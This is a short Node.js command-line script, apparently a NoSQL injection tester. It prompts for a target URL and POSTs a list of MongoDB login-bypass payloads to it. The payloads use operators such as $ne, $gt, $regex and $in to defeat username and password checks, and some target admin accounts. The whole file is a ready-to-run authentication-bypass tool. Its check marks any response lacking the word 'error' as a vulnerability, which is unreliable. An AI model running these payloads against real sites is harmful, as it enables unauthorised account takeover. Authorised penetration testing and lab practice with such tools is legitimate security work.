import axios from 'axios';
import readline from 'readline';
import colors from 'colors';

colors.setTheme({
    startTest: 'yellow',
    endTest: 'blue',
    promptUrl: 'cyan',
    success: 'green',
    error: 'red',
    notFound: 'grey',
    info: 'white',
});

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function checkNoSQLInjection(url, payload) {
    try {
        const response = await axios.post(url, payload);
        if (!response.data.includes("error")) {
            console.log(`[!] Vulnerability found`.success);
        } else {
            console.log(`[+] No vulnerability found`.notFound);
        }
    } catch (error) {
        console.error(`[!] Error occurred`.red);
        console.error(`    Error message: ${error.message}`);
    }
}

rl.question('Please enter the target URL: ', (targetUrl) => {
    console.log(`\nTarget URL: ${targetUrl}\n`.promptUrl);

    // Lista de payloads de prueba para NoSQL Injection recuperada de: https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt
    const payloads = [
        { "username": "wiener","password": {"$ne" : ""}},
        { "username": {"$regex":"admin.*"}, "password": { "$ne": "" } },
        { "username": { "$ne": null }, "password": { "$ne": null } },
        { "username": { "$ne": "foo" }, "password": { "$ne": "bar" } },
        { "username": { "$gt": undefined }, "password": { "$gt": undefined } },
        { "username": {"$gt":""}, "password": {"$gt":""}},
        { "username": {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]},"password": {"$gt": ""}}
    ];

    console.log('Starting NoSQL Injection tests...\n'.startTest);

    (async () => {
        for (const payload of payloads) {
            console.log(`Testing payload: ${JSON.stringify(payload, null, 2)}`.info);
            await checkNoSQLInjection(targetUrl, payload);
            console.log('------------------------------------'.info);
        }

        console.log('NoSQL Injection tests completed.\n'.endTest);
        rl.close();
    })();
});
